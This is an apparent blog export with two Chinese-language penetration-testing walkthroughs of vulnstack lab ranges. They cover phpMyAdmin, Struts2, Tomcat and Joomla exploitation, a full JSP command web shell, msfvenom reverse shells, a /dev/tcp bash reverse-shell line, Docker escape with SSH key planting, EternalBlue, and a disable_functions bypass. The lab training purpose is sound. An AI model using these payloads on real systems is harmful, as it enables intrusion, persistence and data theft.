    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">外网使用NAT模式  内网使用VM3 192.168.181.0&#x2F;24</span><br><span class="line">Ubuntu(ubuntu)      192.168.183.129     192.168.0.180 </span><br><span class="line">DC(Dotest123)       192.168.183.130</span><br><span class="line">Win7(Test2021)      192.168.183.128</span><br></pre></td></tr></table></figure>

<p>开启web机器(ubuntu)的dokcer容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;struts2&#x2F;s2-045</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;tomcat&#x2F;CVE-2017-12615&#x2F;</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;phpmyadmin&#x2F;CVE-2018-12613&#x2F;</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">sudo docker ps  </span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap 192.168.0.180 -sT -Pn -sV </code></p>
<p><img src="/posts/e94e95f1/namp.png"></p>
<p>开放了 22 2001 2002 2003 端口</p>
<p>分别访问了下2001，2002，2003端口</p>
<p>2001    structs2</p>
<p>2002    tomcat</p>
<p>2003    phpmyadmin4.8.1</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="phpmyadmin-CVE-2018-12613"><a href="#phpmyadmin-CVE-2018-12613" class="headerlink" title="phpmyadmin CVE-2018-12613"></a>phpmyadmin CVE-2018-12613</h4><p>看了下phpmyadmin的版本 是4.8.1 先验证下是否存在cve-2018-12613</p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code> 直接运行了/etc/passwd 说明存在该漏洞</p>
<p><img src="/posts/e94e95f1/phpmyadmin1.png"></p>
<p>然后尝试getshell</p>
<p>在sql处 执行 <code>select &#39;&lt;?php phpinfo();?&gt;&#39;</code></p>
<p><img src="/posts/e94e95f1/phpmyadmin2.png"></p>
<p>执行成功后查看 自己的sessionid  phpmyadmin的值 <code>2c8e2d642e3762699d4e070db30880b6</code></p>
<p><img src="/posts/e94e95f1/phpmyadmin_value.png"></p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_2c8e2d642e3762699d4e070db30880b6</code></p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_7f9c04b6ead4e844459d4ec29658e424</code></p>
<p>成功执行之前在sql处的phpinfo命令</p>
<p><img src="/posts/e94e95f1/phpmyadmin_phpinfo.png"></p>
<p>写入一句话</p>
<p>尝试几个一句话都写入失败了，写入后会报错，可能是因为docker的原因</p>
<p><img src="/posts/e94e95f1/phpmyadmin_shell_error.png"></p>
<h4 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h4><p><img src="/posts/e94e95f1/struts2_1.png"></p>
<p><img src="/posts/e94e95f1/struts2_2.PNG"></p>
<p>可以判断是docker容器</p>
<p>上传jsp shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line"> &lt;FORM METHOD&#x3D;&quot;POST&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;</span><br><span class="line"> &lt;&#x2F;FORM&gt;</span><br><span class="line"> &lt;pre&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;</span><br><span class="line">    </span><br><span class="line">         out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">         Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">         OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">         InputStream in &#x3D; p.getInputStream();</span><br><span class="line">         DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">         String disr &#x3D; dis.readLine();</span><br><span class="line">         while ( disr !&#x3D; null ) &#123;</span><br><span class="line">    </span><br><span class="line">                 out.println(disr); disr &#x3D; dis.readLine(); &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;&#x2F;pre&gt;</span><br><span class="line"> &lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/struts2_shell.png"></p>
<h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>使用kali的searchsploit搜索tomcat的poc，这里tomcat版本是8.5</p>
<p><code>searchsploit tomcat 8.5.19</code></p>
<p><img src="/posts/e94e95f1/searchsploit_tomcat.png"></p>
<p><code>searchsploit -m jsp/webapps/42966.py</code></p>
<p><code>sudo python2 42966.py -u http://192.168.0.180:2002</code></p>
<p><code>sudo python2 42966.pu -u http://192.168.0.180:2002 -p pwn</code></p>
<p>访问<code>http://192.168.0.180:2002/pwn.jsp</code></p>
<p><img src="/posts/e94e95f1/tomcat_shell_whoami.png"></p>
<p>判断是docker环境<code>ls -alh /.dockerenv</code>  <code>cat /proc/1/cgroup</code></p>
<h4 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h4><p>生成msf马</p>
<p><code> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=4444 -f elf &gt; shell.elf</code></p>
<p>kali开启http服务</p>
<p><code>sudo python3 -mhttp.server 9999</code></p>
<p>在上传的pwn.jsp通过wget下载msf</p>
<p><code>wget http://192.168.0.128:9999/shell.elf</code></p>
<p><code>chmod 777 shell.elf</code></p>
<p><code>./shell.elf</code></p>
<p>msf开启监听</p>
<p><code>use exploit/multi/handler</code></p>
<p><code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
<p><code>set lhost 192.168.0.128</code></p>
<p><code>set lport 4444</code></p>
<p><code>run</code></p>
<p>成功反弹到shell</p>
<p><img src="/posts/e94e95f1/msf_shell.png"></p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="利用CVE-2019-5736进行docker逃逸"><a href="#利用CVE-2019-5736进行docker逃逸" class="headerlink" title="利用CVE-2019-5736进行docker逃逸"></a>利用CVE-2019-5736进行docker逃逸</h4><p>payload下载地址 <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
<p>下载并编译main,go 修改payload替换为反弹shell </p>
<p><code>var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.0.128/5555 0&gt;&amp; 1&quot;</code></p>
<p>编译生成go文件</p>
<p><code> CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></p>
<p>通过msf将生成的main.go上传到靶机</p>
<p><code>upload ~/桌面/CVE-2019-5736-PoC /home</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home </span><br><span class="line">chmod &#x2F;main</span><br><span class="line">cd &#x2F;main</span><br><span class="line">.&#x2F;main.go</span><br></pre></td></tr></table></figure>

<p>在执行前先在kali上开启监听</p>
<p><code>nc -lvvp 5555</code></p>
<p>但是由于需要宿主机执行命令 才能去触发payload反弹shell</p>
<p>运行完之后 msf进入shell就会卡住…所以就换一种方法 可以使用–privileged（特权模式）进行逃逸</p>
<h4 id="利用–privileged特权模式逃逸"><a href="#利用–privileged特权模式逃逸" class="headerlink" title="利用–privileged特权模式逃逸"></a>利用–privileged特权模式逃逸</h4><p>使用特权模式向宿主机的硬盘中写入ssh私钥，实现ssh免密登录宿主机</p>
<p>1.查看磁盘文件 <code>fdisk -l</code></p>
<p><img src="/posts/e94e95f1/docker_fdisk.png"></p>
<p>2.查看设备文件 <code>ls /dev</code></p>
<p>3.新建目录进行挂载      <code>mkdir /test</code></p>
<p>4.将/dev/sda1挂载到/test目录中  <code>mount /dev/sda1 /test</code></p>
<p>5.查看是否挂载成功 <code>ls /test</code></p>
<p><img src="/posts/e94e95f1/mount_test.png"></p>
<p>6.在kali本地上生成ssh密钥 <code>ssh-keygen -f test</code> ，然后会生成<code>test</code> <code>test.pub</code></p>
<p>赋予600权限<code>chmod 600 test</code></p>
<p>7.将生成的密钥写入到目标机器中</p>
<p>由于前面将 <code>sda1</code>挂载到了<code>/test</code> 所以访问/test/home也就等同于去访问宿主机的/home目录</p>
<p><code>ls /test/home</code></p>
<p><img src="/posts/e94e95f1/ls_test_home.png"></p>
<p>查看所有文件<code>ls -alh /test/home/ubuntu</code></p>
<p><img src="/posts/e94e95f1/ls_test_home_ubuntu.png"></p>
<p>查看.ssh文件 <code>ls -alh /test/home/ubuntu/.ssh/</code></p>
<p><img src="/posts/e94e95f1/ls_test_home_ubuntu_ssh.png"></p>
<p><code>cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</code> # -avx将权限也一起赋予</p>
<p><img src="/posts/e94e95f1/cp_key.png"></p>
<p><code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys</code></p>
<p><code>cat test.pub</code> </p>
<p><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020</code></p>
<br>

<p><code>echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#39; &gt;&gt; /test/home/ubuntu/.ssh/authorized_keys    </code># 将ssh秘钥写入authorized_keys文件</p>
<p><img src="/posts/e94e95f1/echo_ssh_rsa.png"></p>
<p>查看是否写入成功，发现还是没成功，使用<code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys </code>无法清除原有的值，应该是没有写入权限</p>
<p><code> cat /test/home/ubuntu/.ssh/authorized_keys</code></p>
<p><img src="/posts/e94e95f1/cat_ssh_rsa.png"></p>
<p>尝试去上传一个key.sh，内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp -avx &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1&#x2F;QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo&#x2F;mh+Upm+oqqvlkX&#x2F;1PYvsUkXOpLBm&#x2F;Oy&#x2F;ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq&#x2F;o95qGkKaMdPkHWfiDiag2B+BFS&#x2F;Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K&#x2F;Bg3rSlUPD6ibogfIQMTR1Vint2gs&#x3D; kali@kali2020&#39; &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">cat &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>

<p>开启http服务使用靶机下载</p>
<p><code>sudo python3 -m http.server 9999</code></p>
<p><code>wget http://192.168.0.128:9999</code></p>
<p><code>chmod 777 key.sh</code></p>
<p><code>./key.sh</code></p>
<p>还是写入失败了，看了下师傅们也是这样做的没啥问题，然后我就去ubuntu靶机上试了下发现也没法使用echo写入，只能通过<code>sudo vim authorized_keys</code>手动将在kali上生成的密钥复制进去，才能在kali上免密登录</p>
<p><code>ssh -i test ubuntu@192.168.0.181</code></p>
<p><img src="/posts/e94e95f1/ssh_test_ubuntu.png"></p>
<h4 id="上线msf-1"><a href="#上线msf-1" class="headerlink" title="上线msf"></a>上线msf</h4><p>然后在msf生成木马，使用python开启gttp服务，下载后连接shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.128 LPORT&#x3D;8888 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/msf_shell2.png"></p>
<p><code>use exploit/multi/handler </code></p>
<p> <code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
<p>突然不小心把shell.elf断掉了 重新上线了一个 session 12</p>
<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code> use post/multi/manage/autoroute</code></p>
<p><img src="/posts/e94e95f1/autoroute.png"></p>
<p><code>route print</code>查看路由</p>
<p><img src="/posts/e94e95f1/route_print.png"></p>
<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p><code>use auxiliary/server/socks_proxy</code></p>
<p><img src="/posts/e94e95f1/set_socks_proxy.png"></p>
<p><code>sudo /etc/proxychains4.conf</code></p>
<p>修改kali proxychains4.conf配置为<code>socks5 127.0.0.1 1080</code> </p>
<br>

<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>使用smb扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br><span class="line">set rhosts 192.168.183.0&#x2F;24&#96;</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>扫到两台windows机器</p>
<p><img src="/posts/e94e95f1/smb_scan1.png"></p>
<p><img src="/posts/e94e95f1/smb_scan2.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.183.130   win2008</span><br><span class="line">192.168.183.148   win7</span><br></pre></td></tr></table></figure>

<p>用ms17-010扫一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">set rhosts 192.168.183.130,148</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/smb_ms17_010.png"></p>
<p>两台机器都存在ms17-010漏洞</p>
<p>使用ms17-010进行攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:127.0.0.1:1080</span><br><span class="line">set rhosts 192.168.183.148</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 4444</span><br><span class="line">set autorunscript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>两台机器都没打通……</p>
<p><img src="/posts/e94e95f1/ms17010_fail.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack3靶场</title>
    <url>/posts/2ce9ab7f/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>设置VM2 网段为 192.168.93.0/24 需要重启一些centos的网卡<code>service network restart</code></p>
<blockquote>
<p>web-centos     192.168.3.40（这里的ip经常会变化）        192.168.93.100<br>web-ubuntu    192.168.93.120<br>win2008<br>win2012<br>win7</p>
</blockquote>
<p><img src="/posts/2ce9ab7f/tuopu.png"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h4><p><code>sudo nmap 192.168.3.40 -sV</code></p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.3.40 -sV<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-07-25 16:15 CST<br>Nmap scan report for 192.168.3.40<br>Host is up (0.0082s latency).<br>Not shown: 995 filtered ports<br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 5.3 (protocol 2.0)<br>25/tcp   open  tcpwrapped<br>80/tcp   open  http       nginx 1.9.4<br>110/tcp  open  tcpwrapped<br>3306/tcp open  mysql      MySQL 5.7.27-0ubuntu0.16.04.1</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds</p>
</blockquote>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>使用dirmap扫描</p>
<p><code>sudo python3 dirmap.py -i 192.168.3.40 -lcf</code></p>
<p><img src="/posts/2ce9ab7f/dirmap_output.png"></p>
<p>使用dirsearch扫描</p>
<p><code>sudo python3  dirsearch.py -u http://192.168.3.40 -e */</code></p>
<p><img src="/posts/2ce9ab7f/dirsearch_output.png"></p>
<p>得到几个敏感目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][23.75kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;1.php                  </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][0b] http:&#x2F;&#x2F;192.168.3.40&#x2F;2.php                       </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][1.76kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;administrator&#x2F;          </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][1.76kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;administrator&#x2F;index.php </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;bin&#x2F;                                   </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;cache&#x2F;                                 </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][0b] http:&#x2F;&#x2F;192.168.3.40&#x2F;configuration.php           </span><br><span class="line">[200][None][1.88kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;configuration.php~                          </span><br><span class="line">[200][text&#x2F;plain][1.43kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;htaccess.txt                          </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;includes&#x2F;                              </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][3.91kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;index.php               </span><br><span class="line">[200][text&#x2F;plain][6.67kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;LICENSE.txt                           </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][2.67kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;index.php&#x2F;login&#x2F;        </span><br><span class="line">[200][text&#x2F;plain][1.71kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;README.txt                            </span><br><span class="line">[200][text&#x2F;plain][392.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;robots.txt                           </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;templates&#x2F;                             </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;tmp&#x2F;                                   </span><br><span class="line">[200][text&#x2F;plain][628.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;web.config.txt     </span><br></pre></td></tr></table></figure>

<p>访问1.php发现是 phpinfo页面</p>
<p><img src="/posts/2ce9ab7f/phpinfo.png"></p>
<p>访问<code>http://192.168.3.40/configuration.php~</code>应该是配置文件的备份</p>
<p>得到数据库的账号密码</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public $dbtype &#x3D; &#39;mysqli&#39;;</span><br><span class="line">public $host &#x3D; &#39;localhost&#39;;</span><br><span class="line">public $user &#x3D; &#39;testuser&#39;;</span><br><span class="line">public $password &#x3D; &#39;cvcvgjASD!@&#39;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/posts/2ce9ab7f/sql_config.png"></p>
<p>访问<code>http://192.168.3.40/administrator/  </code>看到是Joomla! 搭建的网站，可以使用<code>joomscan</code></p>
<p><code>sudo perl joomscan.pl -u 192.168.3.40  </code></p>
<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库  mysql</span><br><span class="line">        账号:testuser       密码:cvcvgjASD!@</span><br><span class="line">敏感目录</span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;1.php                 phpinfo</span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;administrator&#x2F;        后台登录页面，使用Joomla</span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;configuration.php~    备份配置文件</span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;robots.txt </span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;web.config.txt  </span><br><span class="line">文件路径  	&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">开放端口    22，25，80，110，3306</span><br><span class="line">操作系统    ubuntu16.04.1</span><br><span class="line">后台管理    使用Joomla3.9.12</span><br><span class="line">PHP版本     7.1.32</span><br><span class="line">Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">User&#x2F;Group	www-data(33)&#x2F;33</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="登录mysql创建用户"><a href="#登录mysql创建用户" class="headerlink" title="登录mysql创建用户"></a>登录mysql创建用户</h4><p><code>mysql -utestuser -h 192.168.3.40 -p</code></p>
<p><img src="/posts/2ce9ab7f/mysql_conn.png"></p>
<p>有两个users表 分别为<code>am2zu_users</code>  <code>umnbt_users</code>看下这两个表中有什么有用信息利用</p>
<p><img src="/posts/2ce9ab7f/select_user1.png"></p>
<p><img src="/posts/2ce9ab7f/select_user2.png"></p>
<p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">Joomal通过数据库添加新超级管理员</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO &#96;am2zu_users&#96; (&#96;name&#96;, &#96;username&#96;, &#96;password&#96;, &#96;params&#96;, &#96;registerDate&#96;, &#96;lastvisitDate&#96;, &#96;lastResetTime&#96;) VALUES (&#39;Administrator2&#39;, &#39;admin2&#39;, &#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;, &#39;&#39;, NOW(), NOW(), NOW()); </span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;am2zu_user_usergroup_map&#96; (&#96;user_id&#96;,&#96;group_id&#96;) VALUES (LAST_INSERT_ID(),&#39;8&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/login_error.png"></p>
<p>创建完发现无法登录，重新创建了一个 <code>admin3</code>  <code>secret</code>成功进入后台</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO &#96;am2zu_users&#96;</span><br><span class="line">   (&#96;name&#96;, &#96;username&#96;, &#96;password&#96;, &#96;params&#96;, &#96;registerDate&#96;, &#96;lastvisitDate&#96;, &#96;lastResetTime&#96;)</span><br><span class="line">VALUES (&#39;Administrator3&#39;, &#39;admin3&#39;,</span><br><span class="line">    &#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;, &#39;&#39;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;am2zu_user_usergroup_map&#96; (&#96;user_id&#96;,&#96;group_id&#96;)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#39;8&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/login_success.png"></p>
<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>在Extensions中选择Beez3模板，然后点击New File 创建一个shell.php</p>
<p><img src="/posts/2ce9ab7f/beez3.png"></p>
<p><img src="/posts/2ce9ab7f/create_shell_php.png"></p>
<p><img src="/posts/2ce9ab7f/shell.png"></p>
<p>shell.php在templates/beez3目录下</p>
<p>访问验证是否成功上传shell</p>
<p><img src="/posts/2ce9ab7f/shell_success.png"></p>
<h4 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h4><h5 id="蚁剑disable-functions插件"><a href="#蚁剑disable-functions插件" class="headerlink" title="蚁剑disable_functions插件"></a>蚁剑disable_functions插件</h5><p>使用蚁剑连接shell，在执行命令时，不论写什么都只会返回<code>ret=127</code></p>
<p><img src="/posts/2ce9ab7f/ret_127.png"></p>
<p><img src="/posts/2ce9ab7f/disable_func.png"></p>
<p>使用蚁剑的disable_functions插件，选择<code>PHP7_GC_UAF</code> 成功执行命令</p>
<p><img src="/posts/2ce9ab7f/shell_exec.png"></p>
<h5 id="使用LD-PRELOAD绕过"><a href="#使用LD-PRELOAD绕过" class="headerlink" title="使用LD_PRELOAD绕过"></a>使用LD_PRELOAD绕过</h5><p>工具下载地址：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>使用蚁剑上传 bypass_diablefunc.php 和 bypass_diablefunc_x64.so 到 /templates/beez3/</p>
<p>访问<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php</code></p>
<p>payload:<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/test&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</code></p>
<p><img src="/posts/2ce9ab7f/LD_PRELOAD.png"></p>
<h4 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h4><p><code>ifconfig </code></p>
